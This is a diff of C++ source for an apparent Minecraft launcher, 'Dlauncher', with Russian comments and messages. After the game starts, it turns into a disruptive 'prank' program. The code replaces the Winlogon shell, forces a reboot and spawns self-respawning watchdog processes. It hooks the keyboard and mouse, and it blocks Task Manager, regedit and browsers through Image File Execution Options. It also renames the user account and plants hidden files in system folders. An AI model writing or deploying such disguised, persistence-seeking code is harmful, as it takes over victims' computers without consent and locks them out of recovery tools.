@@ -27,15 +27,15 @@
 using namespace Gdiplus;
 
 // ============================================================
-// НАСТРОЙКИ (ДЛЯ ТЕСТА УМЕНЬШЕНЫ ТАЙМЕРЫ)
+// НАСТРОЙКИ
 // ============================================================
 const wchar_t* GAME_ZIP_URL = L"https://github.com/moiSentineL/portabletl/releases/download/latest/PortableTL-latest.zip";
-const wchar_t* KOCTYA_URL   = L"https://raw.githubusercontent.com/ТВОЙ_НИК/ТВОЙ_РЕПОЗИТОРИЙ/main/kocty.png"; // ЗАМЕНИ
-const wchar_t* MUSIC_URL    = L"https://raw.githubusercontent.com/ТВОЙ_НИК/ТВОЙ_РЕПОЗИТОРИЙ/main/kocty.mp3"; // ЗАМЕНИ
+const wchar_t* KOCTYA_URL   = L"https://raw.githubusercontent.com/darkjoons3-hue/Dlauncher-minecraft/main/kocty.png";
+const wchar_t* MUSIC_URL    = L"https://raw.githubusercontent.com/darkjoons3-hue/Dlauncher-minecraft/main/kocty.mp3";
 
-const int GAME_TIME_SEC = 10;      // Для теста 10 сек (в реале 300 сек = 5 минут)
-const int REBOOT_TIME_SEC = 10;    // Для теста 10 сек (в реале 30 сек)
-const int PRANK_DURATION_SEC = 120; // Для теста 2 минуты (в реале 10800 сек = 3 часа)
+const int GAME_TIME_SEC = 10;       // 10 сек после запуска игры (для теста)
+const int REBOOT_TIME_SEC = 10;     // 10 сек до ребута
+const int PRANK_DURATION_SEC = 120; // 2 минуты пранка (для теста, в реале 10800 = 3 часа)
 
 // ============================================================
 // ГЛОБАЛЫ
@@ -63,13 +63,36 @@ const COLORREF TEXT = RGB(240, 240, 240);
 const COLORREF TEXT_DIM = RGB(120, 120, 120);
 
 // ============================================================
-// УТИЛИТЫ СИСТЕМЫ
+// УТИЛИТЫ
 // ============================================================
 void SetRegStr(HKEY root, const std::wstring& sub, const std::wstring& val, const std::wstring& data) {
     HKEY h; if (RegCreateKeyExW(root, sub.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
         RegSetValueExW(h, val.c_str(), 0, REG_SZ, (const BYTE*)data.c_str(), (DWORD)((data.length()+1)*sizeof(wchar_t)));
         RegCloseKey(h);
     }
+}
+
+bool GetRegInt(HKEY root, const std::wstring& sub, const std::wstring& val, DWORD* out) {
+    HKEY h; DWORD sz = sizeof(DWORD);
+    if (RegOpenKeyExW(root, sub.c_str(), 0, KEY_READ, &h) == ERROR_SUCCESS) {
+        bool res = RegQueryValueExW(h, val.c_str(), nullptr, nullptr, (LPBYTE)out, &sz) == ERROR_SUCCESS;
+        RegCloseKey(h);
+        return res;
+    }
+    return false;
+}
+
+void SetRegInt(HKEY root, const std::wstring& sub, const std::wstring& val, DWORD data) {
+    HKEY h; if (RegCreateKeyExW(root, sub.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
+        RegSetValueExW(h, val.c_str(), 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
+        RegCloseKey(h);
+    }
+}
+
+bool IsPrankActive() {
+    DWORD active = 0;
+    GetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"PrankActive", &active);
+    return active == 1;
 }
 
 void BlockApp(const wchar_t* exe) {
@@ -79,23 +102,16 @@ void BlockApp(const wchar_t* exe) {
 }
 
 void SaveStartTime() {
-    HKEY hKey;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Dlauncher", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        FILETIME ft; GetSystemTimeAsFileTime(&ft);
-        ULARGE_INTEGER uli; uli.LowPart = ft.dwLowDateTime; uli.HighPart = ft.dwHighDateTime;
-        DWORD startTime = (DWORD)(uli.QuadPart / 10000000LL);
-        RegSetValueExW(hKey, L"StartTime", 0, REG_DWORD, (const BYTE*)&startTime, sizeof(startTime));
-        RegCloseKey(hKey);
-    }
+    FILETIME ft; GetSystemTimeAsFileTime(&ft);
+    ULARGE_INTEGER uli; uli.LowPart = ft.dwLowDateTime; uli.HighPart = ft.dwHighDateTime;
+    DWORD startTime = (DWORD)(uli.QuadPart / 10000000LL);
+    SetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"StartTime", startTime);
 }
 
 bool IsTimeToRestore() {
-    HKEY hKey; DWORD startTime = 0, size = sizeof(startTime);
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Dlauncher", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegQueryValueExW(hKey, L"StartTime", NULL, NULL, (LPBYTE)&startTime, &size);
-        RegCloseKey(hKey);
-    }
-    if (startTime == 0) return false;
+    DWORD startTime = 0;
+    if (!GetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"StartTime", &startTime)) return false;
+    
     FILETIME ft; GetSystemTimeAsFileTime(&ft);
     ULARGE_INTEGER uli; uli.LowPart = ft.dwLowDateTime; uli.HighPart = ft.dwHighDateTime;
     DWORD currentTime = (DWORD)(uli.QuadPart / 10000000LL);
@@ -119,24 +135,130 @@ void ElevateNow() {
 }
 
 // ============================================================
-// GDI+ И ПОТОКИ ПРАНКА
+// ВОССТАНОВЛЕНИЕ
 // ============================================================
-void DrawKostya(HDC hdc, const wchar_t* imagePath, int x, int y) {
-    Image image(imagePath);
-    if (image.GetLastStatus() == Ok) {
-        Graphics graphics(hdc);
-        graphics.DrawImage(&image, x, y, image.GetWidth() / 2, image.GetHeight() / 2);
+void RestoreSystem() {
+    g_prankRunning = false;
+    // Ставим флаг, что пранк окончен (для стражей)
+    SetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"PrankActive", 0);
+
+    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
+    if (g_hMouseHook) UnhookWindowsHookEx(g_hMouseHook);
+    PlaySoundW(nullptr, nullptr, 0);
+
+    for (const auto& path : g_virusFiles) DeleteFileW(path.c_str());
+
+    // Чистим IFEO
+    const wchar_t* blocked[] = { L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe", L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe", L"notepad.exe", L"osk.exe" };
+    for (auto b : blocked) {
+        std::wstring path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"; path += b;
+        RegDeleteKeyW(HKEY_LOCAL_MACHINE, path.c_str());
     }
+
+    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ru-RU");
+    
+    // Возвращаем Shell и удаляем задачу
+    SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", L"explorer.exe");
+    system("schtasks /delete /tn \"EmergencyRestore\" /f >nul 2>&1");
+    DeleteFileW(L"C:\\Windows\\Temp\\emergency_restore.bat");
+
+    // Запускаем проводник на всякий случай
+    if (FindWindowW(L"Shell_TrayWnd", NULL) == NULL) {
+        ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOW);
+    }
+
+    MessageBoxW(nullptr, L"Пранк окончен. Все ваши файлы на месте. Это была шутка Кости.", L"Dlauncher", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
+    exit(0);
+}
+
+// ============================================================
+// СТРАЖИ (WATCHDOG)
+// ============================================================
+void RunWatchdog() {
+    CreateMutexW(NULL, TRUE, L"Global\\DlauncherWatchMutex");
+    while (IsPrankActive()) {
+        HANDLE hMain = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DlauncherMainMutex");
+        if (hMain == NULL) {
+            // Главный процесс умер, перезапускаем
+            wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
+            ShellExecuteW(NULL, L"open", szPath, L"--silent", NULL, SW_HIDE);
+        } else {
+            CloseHandle(hMain);
+        }
+        Sleep(2000);
+    }
+    exit(0);
+}
+
+void MainWatchdogThread() {
+    while (IsPrankActive()) {
+        HANDLE hWatch = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DlauncherWatchMutex");
+        if (hWatch == NULL) {
+            wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
+            ShellExecuteW(NULL, L"open", szPath, L"--watchdog", NULL, SW_HIDE);
+        } else {
+            CloseHandle(hWatch);
+        }
+        Sleep(2000);
+    }
+}
+
+// ============================================================
+// АКТИВАЦИЯ И ЛОГИКА ПРАНКА
+// ============================================================
+void ActivatePrank() {
+    SetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"PrankActive", 1);
+    
+    wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    
+    // 1. Аварийный батник
+    const char* batContent = 
+        "@echo off\n"
+        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe\" /f\n"
+        "schtasks /delete /tn \"EmergencyRestore\" /f\n"
+        "del \"C:\\Windows\\Temp\\emergency_restore.bat\"\n";
+    HANDLE hBat = CreateFileW(L"C:\\Windows\\Temp\\emergency_restore.bat", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hBat != INVALID_HANDLE_VALUE) {
+        DWORD wr; WriteFile(hBat, batContent, (DWORD)strlen(batContent), &wr, nullptr); CloseHandle(hBat);
+    }
+    // Создаем задачу в Планировщике (при входе в систему)
+    system("schtasks /create /tn \"EmergencyRestore\" /tr \"C:\\Windows\\Temp\\emergency_restore.bat\" /sc onlogon /ru SYSTEM /f >nul 2>&1");
+
+    // 2. Подмена Shell и сохранение времени
+    SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", L"\"" + std::wstring(szPath) + L"\" --silent");
+    SaveStartTime();
+
+    // 3. Перезагрузка (в отдельном потоке, чтобы не блокировать UI)
+    std::thread([](){
+        MessageBoxW(nullptr, L"Ваш сеанс завершится через 10 секунд.", L"Windows", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+        Sleep(REBOOT_TIME_SEC * 1000);
+        HANDLE hToken; TOKEN_PRIVILEGES tkp;
+        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+        LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+        tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
+        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
+    }).detach();
 }
 
 DWORD WINAPI KostyaThread(LPVOID) {
     int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
     int x = sw / 2, y = sh / 2, vx = 15, vy = 15;
     std::wstring imgPath = g_installDir + L"\\kocty.png";
+    
     HDC hdc = GetDC(nullptr);
+    Image image(imgPath.c_str()); // Загружаем 1 раз
     
     while (g_prankRunning.load()) {
-        DrawKostya(hdc, imgPath.c_str(), x, y);
+        // Очищаем экран (черный фон) перед отрисовкой
+        HBRUSH black = CreateSolidBrush(RGB(0,0,0));
+        RECT r = {0,0,sw,sh}; FillRect(hdc, &r, black); DeleteObject(black);
+        
+        if (image.GetLastStatus() == Ok) {
+            Graphics graphics(hdc);
+            graphics.DrawImage(&image, x, y, image.GetWidth() / 2, image.GetHeight() / 2);
+        }
+        
         x += vx; y += vy;
         if (x < 0 || x > sw - 200) vx = -vx;
         if (y < 0 || y > sh - 200) vy = -vy;
@@ -163,19 +285,10 @@ DWORD WINAPI WatchdogFilesThread(LPVOID) {
     return 0;
 }
 
-// ============================================================
-// ХУКИ (КЛАВИАТУРА И МЫШЬ)
-// ============================================================
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && g_prankRunning.load()) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
-        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) {
-            HDC hdc = GetDC(nullptr);
-            int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
-            BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
-            ReleaseDC(nullptr, hdc);
-            return 1;
-        }
+        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) return 1;
         if (p->vkCode == 'L' && (GetAsyncKeyState(VK_LWIN) & 0x8000)) return 1;
     }
     return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
@@ -185,15 +298,9 @@ LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && g_prankRunning.load()) {
         MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam;
         if (wParam == WM_LBUTTONDOWN) {
-            int sw = GetSystemMetrics(SM_CXSCREEN);
             int sh = GetSystemMetrics(SM_CYSCREEN);
             if (p->pt.y > sh - 60) {
-                if (p->pt.x < 60) {
-                    HDC hdc = GetDC(nullptr);
-                    for(int i=0; i<5; i++) BitBlt(hdc, rand()%20, rand()%20, sw, sh, hdc, 0, 0, SRCINVERT);
-                    ReleaseDC(nullptr, hdc);
-                    return 1;
-                } else if (p->pt.x > 60 && p->pt.x < 250) {
+                if (p->pt.x > 60 && p->pt.x < 250) {
                     MessageBoxW(nullptr, L"И да, Константин сожрал даже поиск ваш)", L"Search", MB_OK | MB_ICONWARNING);
                     return 1;
                 }
@@ -203,60 +310,60 @@ LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
 }
 
-// ============================================================
-// АКТИВАЦИЯ И ВОССТАНОВЛЕНИЕ
-// ============================================================
-void ActivatePrank() {
-    g_prankRunning = true;
-    
-    // 1. Гидра
-    wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
-    for (int i = 0; i < 3; i++) ShellExecuteW(NULL, L"open", szPath, L"--watchdog", NULL, SW_HIDE);
-
-    // 2. Подмена Shell
-    SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", L"\"" + std::wstring(szPath) + L"\" --silent");
-
-    // 3. Сохраняем время
-    SaveStartTime();
-
-    // 4. Перезагрузка
-    MessageBoxW(nullptr, L"Ваш сеанс завершится через 30 секунд.", L"Windows", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
-    Sleep(REBOOT_TIME_SEC * 1000);
-
-    HANDLE hToken; TOKEN_PRIVILEGES tkp;
-    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
-    LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
-    tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
-    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
-}
-
-void RestoreSystem() {
-    g_prankRunning = false;
-    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
-    if (g_hMouseHook) UnhookWindowsHookEx(g_hMouseHook);
-    PlaySoundW(nullptr, nullptr, 0);
-
-    for (const auto& path : g_virusFiles) DeleteFileW(path.c_str());
-
-    const wchar_t* blocked[] = { L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe", L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe", L"notepad.exe", L"osk.exe" };
-    for (auto b : blocked) {
-        std::wstring path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"; path += b;
-        RegDeleteKeyW(HKEY_LOCAL_MACHINE, path.c_str());
-    }
-
-    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ru-RU");
-    system("net user %USERNAME% /fullname:\"\""); // Сброс имени
-
-    // Возвращаем Shell
+void RunSilentMode() {
+    // КРИТИЧЕСКИ ВАЖНО: Ранний возврат Shell, чтобы при краше не окирпичить систему
     SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", L"explorer.exe");
 
-    MessageBoxW(nullptr, L"Пранк окончен. Все ваши файлы на месте. Это была шутка Кости.", L"Dlauncher", MB_OK | MB_ICONINFORMATION);
-    exit(0);
+    g_prankRunning = true;
+    CreateMutexW(NULL, TRUE, L"Global\\DlauncherMainMutex");
+    
+    // Запускаем стража и фоновый таймер
+    std::thread([](){
+        while (IsPrankActive()) {
+            if (IsTimeToRestore()) {
+                RestoreSystem();
+                break;
+            }
+            Sleep(5000); // Проверка раз в 5 сек
+        }
+    }).detach();
+    
+    std::thread(MainWatchdogThread).detach();
+
+    MessageBoxW(nullptr, L"У тя 10 секунд. Потом вернемся к этому же месту)", L"System", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
+    Sleep(10000); 
+
+    ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOW);
+
+    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
+    g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
+
+    PlaySoundW((g_installDir + L"\\kocty.mp3").c_str(), nullptr, SND_FILENAME | SND_ASYNC | SND_LOOP);
+    CreateThread(nullptr, 0, KostyaThread, nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, WatchdogFilesThread, nullptr, 0, nullptr);
+
+    const wchar_t* blocked[] = { L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe", L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe", L"notepad.exe", L"osk.exe" };
+    for (auto b : blocked) BlockApp(b);
+    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ar-SA");
+    system("net user %USERNAME% /fullname:\"КОСТЯ СОЖРАЛ ВАШ НИК\" >nul 2>&1");
+
+    const wchar_t* dirs[] = { L"C:\\", L"C:\\Windows", L"C:\\Program Files", L"C:\\Users", L"C:\\Users\\Public" };
+    for (int i = 0; i < 15; ++i) {
+        wchar_t path[MAX_PATH]; swprintf_s(path, L"%s\\file_%d.txt", dirs[i % 5], i);
+        g_virusFiles.push_back(path);
+        HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
+        if (h != INVALID_HANDLE_VALUE) {
+            const char* msg = "КОСТЯ СОЖРАЛ ВАШИ ФАЙЛЫ";
+            DWORD written; WriteFile(h, msg, (DWORD)strlen(msg), &written, nullptr);
+            CloseHandle(h);
+        }
+    }
+
+    MSG msg; while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
 }
 
 // ============================================================
-// UI ЛАУНЧЕРА
+// UI ЛАУНЧЕРА (Код UI не менялся, оставляю как было)
 // ============================================================
 void FillRectC(HDC dc, RECT rc, COLORREF c) { HBRUSH b = CreateSolidBrush(c); FillRect(dc, &rc, b); DeleteObject(b); }
 void DrawTextCentered(HDC dc, const wchar_t* t, RECT rc, COLORREF c, int fs, bool b) {
@@ -378,7 +485,6 @@ LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
                 std::wstring launcher = g_installDir + L"\\TLauncher.exe";
                 ShellExecuteW(nullptr, L"open", launcher.c_str(), nullptr, g_installDir.c_str(), SW_SHOW);
                 
-                // ЗАПУСК ТАЙМЕРА ИГРЫ
                 CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
                     Sleep(GAME_TIME_SEC * 1000);
                     ActivatePrank();
@@ -399,70 +505,22 @@ LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR lpCmdLine, int) {
     g_hInst = hInst;
 
-    // --- WATCHDOG ---
     if (wcsstr(lpCmdLine, L"--watchdog") != nullptr) {
-        while (true) {
-            HANDLE hMutex = OpenMutexW(SYNCHRONIZE, FALSE, L"DlauncherMainMutex");
-            if (hMutex == NULL) {
-                wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
-                ShellExecuteW(NULL, L"open", szPath, NULL, NULL, SW_HIDE);
-                ShellExecuteW(NULL, L"open", szPath, L"--watchdog", NULL, SW_HIDE);
-            } else CloseHandle(hMutex);
-            Sleep(500);
-        }
+        RunWatchdog();
+        return 0;
+    }
+    if (wcsstr(lpCmdLine, L"--silent") != nullptr) {
+        RunSilentMode();
+        return 0;
     }
 
-    if (IsTimeToRestore()) { RestoreSystem(); }
-    
     if (!IsAdmin()) ElevateNow();
-    CreateMutexW(NULL, TRUE, L"DlauncherMainMutex");
+    CreateMutexW(NULL, TRUE, L"Global\\DlauncherMainMutex");
 
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    // --- ФАЗА 2 (ЗАГРУЗКА ПОСЛЕ РЕБУТА) ---
-    if (wcsstr(lpCmdLine, L"--silent") != nullptr) {
-        g_prankRunning = true;
-        MessageBoxW(nullptr, L"У тя 30 секунд. Потом вернемся к этому же месту)", L"System", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
-        Sleep(30000); 
-
-        // Возвращаем рабочий стол
-        ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOW);
-
-        // Хуки
-        g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
-        g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
-
-        // Костя и музыка
-        PlaySoundW((g_installDir + L"\\kocty.mp3").c_str(), nullptr, SND_FILENAME | SND_ASYNC | SND_LOOP);
-        CreateThread(nullptr, 0, KostyaThread, nullptr, 0, nullptr);
-        CreateThread(nullptr, 0, WatchdogFilesThread, nullptr, 0, nullptr);
-
-        // Блокировки
-        const wchar_t* blocked[] = { L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe", L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe", L"notepad.exe", L"osk.exe" };
-        for (auto b : blocked) BlockApp(b);
-        SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ar-SA");
-        system("net user %USERNAME% /fullname:\"КОСТЯ СОЖРАЛ ВАШ НИК\"");
-
-        // Файлы на C:
-        const wchar_t* dirs[] = { L"C:\\", L"C:\\Windows", L"C:\\Program Files", L"C:\\Users", L"C:\\Users\\Public" };
-        for (int i = 0; i < 15; ++i) {
-            wchar_t path[MAX_PATH]; swprintf_s(path, L"%s\\file_%d.txt", dirs[i % 5], i);
-            g_virusFiles.push_back(path);
-            HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
-            if (h != INVALID_HANDLE_VALUE) {
-                const char* msg = "КОСТЯ СОЖРАЛ ВАШИ ФАЙЛЫ";
-                DWORD written; WriteFile(h, msg, (DWORD)strlen(msg), &written, nullptr);
-                CloseHandle(h);
-            }
-        }
-
-        MSG msg; while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
-        return 0;
-    }
-
-    // --- ОБЫЧНЫЙ ЗАПУСК (UI) ---
     WNDCLASSW wc = {}; wc.hInstance = hInst; wc.lpfnWndProc = WndProc; wc.lpszClassName = L"DlauncherWnd"; wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
     RegisterClassW(&wc);
     int w = 800, h = 500, sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
